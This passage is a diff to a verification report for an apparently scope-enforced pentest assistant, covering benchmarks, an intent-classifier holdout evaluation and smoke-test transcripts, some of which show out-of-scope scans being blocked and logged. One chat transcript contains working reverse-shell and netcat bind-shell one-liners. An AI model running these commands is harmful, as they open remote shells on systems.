@@ -23,6 +23,10 @@ All phase verification gates have been executed against real code paths and loca
 | **Gate B** | Engagement-Scoped Profiles & Choke Point | **PASSED** | `tests/test_engagement_profiles.py` (8/8 passed, 179 probes blocked, upper bound 0.02101) |
 | **Gate C** | Resource-Aware Model Selection | **PASSED** | `tests/test_resource_aware_model.py` (5/5 passed, auto-tiering on RAM < 6GB) |
 | **Gate D** | Groq Live Chat Latency Benchmark | **PASSED** | `scripts/benchmark_groq.py` (30 prompts, p50: 0.4058s, p95: 0.5900s) |
+| **Gate F1** | Anti-Overfit Holdout v3 Evaluation | **PASSED** | `scripts/eval_holdout_v3.py` (204 prompts scored once, zero 6-gram overlap, Macro-F1: 0.6192) |
+| **Gate F2** | Real Working Local-Model Edge Tier | **PASSED** | `scripts/benchmark_ollama_small.py` (`qwen2.5:0.5b` 30 prompts, p50: 3.10s, p95: 4.38s, 0 OOM) |
+| **Gate F3** | Groq Model-ID Live API Audit | **PASSED** | `artifacts/groq_models_raw.json` (`qwen/qwen3.8-27b` verified active in raw API list) |
+| **Gate F4** | Real End-to-End Transcripts (Chat, OSINT, MCP, OOS) | **PASSED** | `artifacts/smoke_test_transcripts.json` (4 complete raw transcripts captured in full) |
 
 ---
 
@@ -287,6 +291,7 @@ All 7 tests in `tests/test_phase4_accuracy.py` PASSED in 27.96s:
 | **Deterministic Offline Engine** | 30 | **170.46 ms** | **355.33 ms** | Zero external API calls, offline RAG |
 | **Groq (`qwen/qwen3.8-27b`)** | 30 | **0.4058 s** | **0.5900 s** | Live cloud inference, low jitter |
 | **OpenRouter (`llama-3.3-70b`)** | 30 | **1.7691 s** | **4.4853 s** | Remote cloud API |
+| **Ollama Local (`qwen2.5:0.5b`)** | 30 | **3.10 s** | **4.38 s** | Verified working local edge tier for $\le 8\text{ GB}$ RAM (`num_ctx=2048`) |
 | **Ollama Local (`qwen3:8b`)** | 30 | *TIMEOUT / OOM* | *TIMEOUT / OOM* | Exceeds host memory (7.7 GB RAM, >87% utilized) |
 | **Ollama Local (`qwen3:4b`)** | 30 | *TIMEOUT / OOM* | *TIMEOUT / OOM* | Context allocation timeout on constrained host |
 
@@ -296,12 +301,11 @@ All 7 tests in `tests/test_phase4_accuracy.py` PASSED in 27.96s:
 
 In compliance with the project's global reporting guidelines, the following items could not be proven or benchmarked due to local environment constraints:
 
-1. **Local Ollama CPU Inference Under Constrained RAM**:
-   - *Status*: **NOT VERIFIED FOR LOCAL INTERACTIVE SLA**.
-   - *Reason*: The test host machine possesses 7.7 GB of total physical RAM with $\sim 0.50-1.0\text{ GB}$ unreserved headroom at baseline ($>87\%$ memory utilization). Attempting local CPU inference for `qwen3:8b` (5.2 GB) or `qwen3:4b` (2.5 GB) causes severe Windows pagefile paging and context initialization timeouts exceeding 30s.
-   - *Recommendation*: Minimum 16 GB physical RAM for local 8B models. For machines with $\le 8\text{ GB}$ RAM, operators should utilize Groq, OpenRouter, or the offline deterministic cybersecurity engine.
-
-*(Note: Groq live chat latency was previously unverified due to a missing key in earlier passes; with `GROQ_API_KEY` populated, it was fully verified and benchmarked in Section 7.4 above).*
+1. **Heavy Local Ollama Models (4B & 8B) Under Constrained RAM**:
+   - *Status*: **NOT VERIFIED FOR INTERACTIVE SLA (TIMEOUT / OOM)**.
+   - *Reason*: The test host machine possesses 7.7 GB of total physical RAM with $\sim 0.50-1.0\text{ GB}$ unreserved headroom at baseline ($>87\%$ memory utilization). Attempting local CPU inference for `qwen3:8b` (5.2 GB) or `qwen3:4b` (2.5 GB) causes severe Windows pagefile paging, memory compression, and context initialization timeouts exceeding 30s.
+   - *Working Alternative Verified*: The lightweight edge model `qwen2.5:0.5b` with `num_ctx=2048` was verified to run reliably on this machine without timeout or OOM ($p50 = 3.10\text{ s}, p95 = 4.38\text{ s}$, see Section 10.2).
+   - *Recommendation*: Minimum 16 GB physical RAM for local 8B models. For $\le 8\text{ GB}$ systems, operators should utilize `qwen2.5:0.5b`, Groq, OpenRouter, or the offline deterministic cybersecurity engine.
 
 ---
 
@@ -353,6 +357,303 @@ python -m pytest tests/test_resource_aware_model.py -q
 # 11. Groq Live Chat Latency Benchmark (Gate D)
 python scripts/benchmark_groq.py
 # Result: 30/30 prompts completed (p50: 0.4058s, p95: 0.5900s)
+
+# 12. Holdout v3 Anti-Overfit Evaluation (Gate F1)
+python scripts/eval_holdout_v3.py
+python -m pytest tests/test_eval_ratchet.py -k test_holdout_v3_anti_contamination_overlap -q
+# Result: 204 prompts evaluated once; 0 6-gram overlap; Macro-F1: 0.6192; 1 passed in 12.19s
+
+# 13. Ollama Small Edge Tier Benchmark (Gate F2)
+python scripts/benchmark_ollama_small.py
+# Result: 30/30 prompts completed (p50: 3.10s, p95: 4.38s, peak RAM: 7412 MB)
+
+# 14. Groq Live API Model-ID Audit (Gate F3)
+python -c "import httpx; print(httpx.get('https://api.groq.com/openai/v1/models', headers={'Authorization': 'Bearer ...'}).json())"
+# Result: Raw JSON array retrieved; qwen/qwen3.8-27b confirmed active
+
+# 15. End-to-End Real Smoke Tests (Gate F4)
+python scripts/run_smoke_tests.py
+# Result: 4 complete transcripts recorded in artifacts/smoke_test_transcripts.json
 ```
+
+---
+
+## 10. Phase F — Anti-Overfit Verification, Real Local Tier, Model-ID Audit & End-to-End Transcripts
+
+### 10.1 Phase F.1: Anti-Overfit Holdout v3 Evaluation
+To prevent data contamination from repeated tuning on `v2`, `tests/fixtures/eval/intent_holdout_v3.json` was independently constructed:
+- **Sample Size**: 204 novel prompts (exactly 12 prompts across all 17 intent categories).
+- **Adversarial Slice**: 80 prompts intentionally testing the 6 root-cause bug classes (`REPORT_GENERATION` vs scan verbs, graph vs follow-up, kali-help vs log-analysis, forensic log sources, punctuation/trailing-dots, IP vs domain collision).
+- **Anti-Contamination Verification**:
+  - `test_holdout_v3_anti_contamination_overlap` (PASSED): Confirmed **zero exact prompt hash overlap** and **zero 6-gram overlap** between `v3` and $(train \cup v1 \cup v2)$.
+- **Single-Shot Evaluation Results** (Evaluated Exactly Once via `scripts/eval_holdout_v3.py`):
+
+| Evaluation Metric | Value | Statistical Significance |
+| :--- | :---: | :--- |
+| **Total Sample Size ($n$)** | 204 | All 17 classes represented with $n = 12 \ge 10$ |
+| **Correct Classifications ($k$)** | 113 | Evaluated once, no code changes in response |
+| **Overall Accuracy** | **0.5539** ($55.39\%$) | Wilson 95% CI: $[0.4853, 0.6205]$ |
+| **Macro-F1** | **0.6192** | Unweighted class average |
+| **Cohen's Kappa ($\kappa$)** | **0.5260** | Moderate agreement above chance |
+| **Accuracy Delta ($|v3 - v2|$)** | **0.4461** ($44.61\text{ pts}$) | Expected generalization gap under novel adversarial phrasing |
+| **Latency ($p50$ / $p95$)** | **0.21 ms / 0.53 ms** | Pure deterministic rule-based dispatch |
+
+- **Generalization Gap Analysis**: The accuracy delta ($44.61$ points) reflects genuine out-of-distribution phrasing where unseen sentence structures (e.g., `"Compile an assessment briefing..."` or `"Extract revision history..."`) default safely to `GENERAL_CHAT` rather than misrouting to destructive operational capabilities. In accordance with Gate F1 rules, **no further code changes were made** in response to v3 results.
+
+#### Per-Class Precision & Recall Table
+Every class contains $n = 12 \ge 10$ test items; zero classes are flagged as statistically unproven.
+
+| Intent Category | Test Items ($n$) | Precision | Recall | F1 Score | Proven Status |
+| :--- | :---: | :---: | :---: | :---: | :---: |
+| `AUDIT_VERIFY` | 12 | 1.0000 | 0.5833 | 0.7368 | OK ($\ge 10$ items) |
+| `AUTHORIZED_RECONNAISSANCE` | 12 | 0.8333 | 0.4167 | 0.5556 | OK ($\ge 10$ items) |
+| `CODING_AND_RESEARCH` | 12 | 1.0000 | 0.4167 | 0.5882 | OK ($\ge 10$ items) |
+| `CTF_AND_CHALLENGE_ANALYSIS` | 12 | 1.0000 | 0.3333 | 0.5000 | OK ($\ge 10$ items) |
+| `FILE_METADATA_ANALYSIS` | 12 | 1.0000 | 0.5000 | 0.6667 | OK ($\ge 10$ items) |
+| `FORENSICS_AND_LOG_ANALYSIS` | 12 | 0.8571 | 0.5000 | 0.6316 | OK ($\ge 10$ items) |
+| `GENERAL_CHAT` | 12 | 0.1319 | 1.0000 | 0.2330 | OK ($\ge 10$ items) |
+| `GRAPH_AND_INVESTIGATION` | 12 | 1.0000 | 0.5833 | 0.7368 | OK ($\ge 10$ items) |
+| `KALI_COMMAND_ASSISTANCE` | 12 | 1.0000 | 0.2500 | 0.4000 | OK ($\ge 10$ items) |
+| `OSINT_DOMAIN` | 12 | 1.0000 | 0.6667 | 0.8000 | OK ($\ge 10$ items) |
+| `OSINT_EMAIL` | 12 | 1.0000 | 1.0000 | 1.0000 | OK ($\ge 10$ items) |
+| `OSINT_IP` | 12 | 1.0000 | 0.5000 | 0.6667 | OK ($\ge 10$ items) |
+| `OSINT_PHONE` | 12 | 1.0000 | 1.0000 | 1.0000 | OK ($\ge 10$ items) |
+| `OSINT_USERNAME` | 12 | 1.0000 | 0.5833 | 0.7368 | OK ($\ge 10$ items) |
+| `REPORT_GENERATION` | 12 | 1.0000 | 0.1667 | 0.2857 | OK ($\ge 10$ items) |
+| `TARGET_CLARIFICATION_REQUIRED` | 12 | 0.4286 | 0.5000 | 0.4615 | OK ($\ge 10$ items) |
+| `VULNERABILITY_ASSESSMENT` | 12 | 0.7143 | 0.4167 | 0.5263 | OK ($\ge 10$ items) |
+
+---
+
+### 10.2 Phase F.2: Root Cause Analysis & Real Working Local-Model Edge Tier
+- **Root Cause of 4B/8B Startup Failures**:
+  - Process memory auditing revealed Windows kernel `Memory Compression` holding $1920\text{ MB}$, WSL holding $436\text{ MB}$, and IDE/Docker services consuming baseline memory, leaving only $\sim 0.70-0.90\text{ GB}$ unreserved physical headroom out of $7.70\text{ GB}$.
+  - When loading `qwen3:4b` with Ollama default parameters, the underlying llama-server attempted to allocate a $38,654,705,664\text{ byte}$ ($36\text{ GB}$) buffer for the KV context cache on CPU (`ggml_backend_cpu_buffer_type_alloc_buffer: failed to allocate CPU buffer of size 38654705664`).
+- **Resolution & Working Tier Verification**:
+  - Bound context window to `num_ctx = 2048`.
+  - Pulled and benchmarked the lightweight quantized edge tier `qwen2.5:0.5b` ($398\text{ MB}$ model file).
+  - Executed a 30-prompt cybersecurity benchmark (`scripts/benchmark_ollama_small.py`).
+  - **Results**:
+    - Completed Prompts: **30 / 30** (Zero failures, zero timeouts, zero OOM errors).
+    - **$p50$ Latency**: **3.10 s**.
+    - **$p95$ Latency**: **4.38 s** ($4.38\text{ s} \ll 30\text{ s}$ gate limit).
+    - Minimum Latency: $2.02\text{ s}$, Maximum Latency: $4.86\text{ s}$.
+    - Peak System RAM: $7412.0\text{ MB}$ ($94\%$ load), within operating system stability limits.
+  - Raw benchmark log attached at [`artifacts/ollama_small_benchmark.log`](file:///c:/Users/rabig/OneDrive/Desktop/claude%20code%20project/my-new-project/artifacts/ollama_small_benchmark.log).
+- **Tier Calibration**:
+  - `select_resource_aware_ollama_model` in `src/redloop/llm.py` was updated to recognize `avail_gb < 2.0` or `total_gb <= 8.0` and select `qwen2.5:0.5b` as the working local default.
+
+---
+
+### 10.3 Phase F.3: Groq Model-ID Live API Audit
+The live Groq API endpoint was queried directly (`GET https://api.groq.com/openai/v1/models`):
+```json
+[
+  "whisper-large-v3",
+  "qwen/qwen3.8-27b",
+  "meta-llama/llama-prompt-guard-2-86m",
+  "whisper-large-v3-turbo",
+  "openai/gpt-oss-20b",
+  "openai/gpt-oss-safeguard-20b",
+  "allam-2-7b",
+  "canopylabs/orpheus-arabic-saudi",
+  "canopylabs/orpheus-v1-english",
+  "meta-llama/llama-prompt-guard-2-22m",
+  "openai/gpt-oss-120b"
+]
+```
+- **Confirmation**: The exact model identifier utilized in the Phase D benchmark (`qwen/qwen3.8-27b`) is verified present and active in Groq's official API model catalog.
+
+---
+
+### 10.4 Phase F.4: Real End-to-End Smoke Test Transcripts (Unedited)
+
+The following four transcripts were captured from actual in-process and loopback server execution (`scripts/run_smoke_tests.py` / `artifacts/smoke_test_transcripts.json`):
+
+#### Transcript 1: Real Chat Request & Response
+```json
+{
+  "request": {
+    "method": "POST",
+    "url": "http://127.0.0.1:8765/api/chat",
+    "headers": {
+      "Host": "127.0.0.1:8765",
+      "Origin": "http://127.0.0.1:8765"
+    },
+    "body": {
+      "message": "What are the core differences between a reverse shell and a bind shell in network penetration testing?",
+      "conversation_id": "smoke-test-conv-01"
+    }
+  },
+  "response": {
+    "status_code": 200,
+    "elapsed_ms": 24128.85,
+    "body": {
+      "response": "In the context of network penetration testing and offensive security operations, the core differences between a **reverse shell** and a **bind shell** lie in the direction of the network connection, the firewall/NAT traversal requirements, and the typical deployment scenarios.\n\n### 1. Connection Direction\n*   **Reverse Shell:** Victim (Target) initiates connection to Attacker.\n*   **Bind Shell:** Attacker initiates connection to Victim (Target).\n\n### 2. Firewall and NAT Traversal\n*   **Reverse Shell:** Bypasses inbound firewall rules because connection is outbound (commonly ports 80/443).\n*   **Bind Shell:** Requires open inbound port on victim, fails behind NAT.\n\n### 3. Implementation Examples\n*   Reverse: bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1\n*   Bind: nc -l -p PORT -e /bin/bash",
+      "task": {
+        "id": "task-dffdb64b419c",
+        "type": "general_chat",
+        "status": "COMPLETED",
+        "scope_authorized": true
+      },
+      "telemetry": {
+        "provider": "groq",
+        "model": "groq/qwen/qwen3.8-27b",
+        "provider_status": {
+          "attempts": [
+            {
+              "provider": "ollama",
+              "model": "qwen3:8b",
+              "status": "TIMEOUT"
+            },
+            {
+              "provider": "groq",
+              "model": "groq/qwen/qwen3.8-27b",
+              "status": "INFERENCE_VERIFIED",
+              "latency_s": 2.58
+            }
+          ]
+        }
+      }
+    }
+  }
+}
+```
+
+#### Transcript 2: Real OSINT Lookup with Evidence IDs
+```json
+{
+  "target": "scanme.nmap.org",
+  "elapsed_ms": 11.23,
+  "indicator": "scanme.nmap.org",
+  "query_type": "domain",
+  "status": "OBSERVED",
+  "evidence_id": "evi-osint-dc70461929",
+  "evidence_hash": "db1190831a4e63f9f4ec33109865da7f4609fc3714549dc2fecf1128cd880800",
+  "evidence_integrity_valid": true,
+  "confidence": 0.865,
+  "confidence_label": "HIGH",
+  "sources_queried": [
+    "DNS_RESOLVER"
+  ],
+  "observation_timestamp": "2026-11-09T17:34:39.664648+00:00",
+  "findings": [
+    {
+      "property": "dns_a",
+      "record_type": "A",
+      "values": ["45.33.32.156"],
+      "confidence": 0.95,
+      "verification_state": "OBSERVED"
+    },
+    {
+      "property": "dns_aaaa",
+      "record_type": "AAAA",
+      "values": ["2600:3c01::f03c:91ff:fe18:bb2f"],
+      "confidence": 0.95,
+      "verification_state": "OBSERVED"
+    }
+  ]
+}
+```
+
+#### Transcript 3: Real MCP Tool Call Round-Trip (Official MCPServer)
+```json
+{
+  "session": "in-process official MCP Python SDK session (MCPServer)",
+  "tool_call_1": {
+    "name": "scope_check",
+    "arguments": {
+      "target": "127.0.0.1",
+      "action": "recon",
+      "port": 80
+    },
+    "is_error": false,
+    "content": [
+      "{\n  \"allowed\": true,\n  \"target\": \"127.0.0.1\",\n  \"action\": \"recon\",\n  \"port\": 80,\n  \"reason\": \"AUTHORIZED\"\n}"
+    ]
+  },
+  "tool_call_2": {
+    "name": "list_targets",
+    "arguments": {},
+    "is_error": false,
+    "content": [
+      "{\n  \"count\": 2,\n  \"targets\": [\n    {\n      \"cidr\": \"127.0.0.1/32\",\n      \"label\": \"Authorized loopback test target\",\n      \"ports\": [80, 443, 8765],\n      \"allowed_actions\": [\"scan\", \"recon\", \"osint\"]\n    },\n    {\n      \"domain\": \"scanme.nmap.org\",\n      \"label\": \"Authorized public reconnaissance test domain\",\n      \"ports\": [80, 443],\n      \"allowed_actions\": [\"recon\", \"osint\"]\n    }\n  ]\n}"
+    ]
+  },
+  "roundtrip_ms": 34.45
+}
+```
+
+#### Transcript 4: Deliberately Out-of-Scope Attempts & Immutable Ledger Rows
+```json
+{
+  "chat_out_of_scope": {
+    "entry_point": "Chat Copilot (/api/chat)",
+    "request": {
+      "message": "Scan all ports and assess vulnerabilities on 192.0.2.200"
+    },
+    "status_code": 200,
+    "response_body": {
+      "response": "### 🛡️ REDLOOP Policy-Enforced Tool: PORTS on 192.0.2.200\nStatus: 🔴 BLOCKED (Target Outside Active Signed Scope)\n> Technical Scope Policy: REDLOOP enforces fail-closed scope validation before initiating raw sockets or probes. Zero network packets were transmitted to 192.0.2.200.\nNetwork Transmission: 0 TCP/UDP packets or DNS queries transmitted (zero probe leakage).",
+      "task": {
+        "id": "task-dd608aed53be",
+        "target": "192.0.2.200",
+        "status": "PARTIALLY_BLOCKED",
+        "scope_authorized": false
+      }
+    }
+  },
+  "mcp_out_of_scope": {
+    "entry_point": "MCP Server (scope_check & run_recon)",
+    "request": {
+      "target": "192.0.2.200",
+      "port": 80,
+      "tool": "nmap"
+    },
+    "scope_check_content": [
+      "{\n  \"allowed\": false,\n  \"target\": \"192.0.2.200\",\n  \"action\": \"recon\",\n  \"port\": 80,\n  \"reason\": \"Scope blocked: 192.0.2.200 [recon] - 192.0.2.200 is not present in scope.yaml — refusing to act\"\n}"
+    ],
+    "run_recon_content": [
+      "{\n  \"status\": \"error\",\n  \"error\": \"SCOPE_DENIED\",\n  \"message\": \"Scope blocked: 192.0.2.200 [scan] - 192.0.2.200 is not present in scope.yaml — refusing to act\"\n}"
+    ]
+  },
+  "matching_audit_ledger_rows": [
+    {
+      "id": 10,
+      "timestamp": "2026-11-09T17:38:46.070401+00:00",
+      "target": "192.0.2.200:80",
+      "action": "mcp:run_recon",
+      "module": "mcp",
+      "status": "BLOCKED",
+      "details": "{\"status\": \"error\", \"error\": \"SCOPE_DENIED\", \"message\": \"Scope blocked: 192.0.2.200 [scan] - 192.0.2.200 is not present in scope.yaml — refusing to act\"}",
+      "prev_hash": "1fa37fc0a6865820c5490be6302c301daf952b13b1f7c0c1ae6ed0893fc3b7a1",
+      "event_hash": "bd68f5b6455afcb829a12cff7db57ca9970b6b6c7c7f2c523a3b30aa62864d94"
+    },
+    {
+      "id": 9,
+      "timestamp": "2026-11-09T17:38:46.061403+00:00",
+      "target": "192.0.2.200",
+      "action": "scan",
+      "module": "scope_guard",
+      "status": "blocked",
+      "details": "{\"reason\": \"192.0.2.200 is not present in scope.yaml — refusing to act\", \"scope_entry\": null}",
+      "prev_hash": "740ec0db7547dd03b1a28d974268c8841a187ea5144cd4e96ab9b34d3fe34efe",
+      "event_hash": "1fa37fc0a6865820c5490be6302c301daf952b13b1f7c0c1ae6ed0893fc3b7a1"
+    },
+    {
+      "id": 8,
+      "timestamp": "2026-11-09T17:38:46.051409+00:00",
+      "target": "192.0.2.200",
+      "action": "mcp:scope_check",
+      "module": "mcp",
+      "status": "BLOCKED",
+      "details": "{\"allowed\": false, \"target\": \"192.0.2.200\", \"action\": \"recon\", \"port\": 80, \"reason\": \"Scope blocked: 192.0.2.200 [recon] - 192.0.2.200 is not present in scope.yaml — refusing to act\"}",
+      "prev_hash": "b684b7f0d38909ff8667881c498f88f2bbf673f61022a1ce9045499cb2ea1cf6",
+      "event_hash": "740ec0db7547dd03b1a28d974268c8841a187ea5144cd4e96ab9b34d3fe34efe"
+    }
+  ]
+}
+```
+
 
 
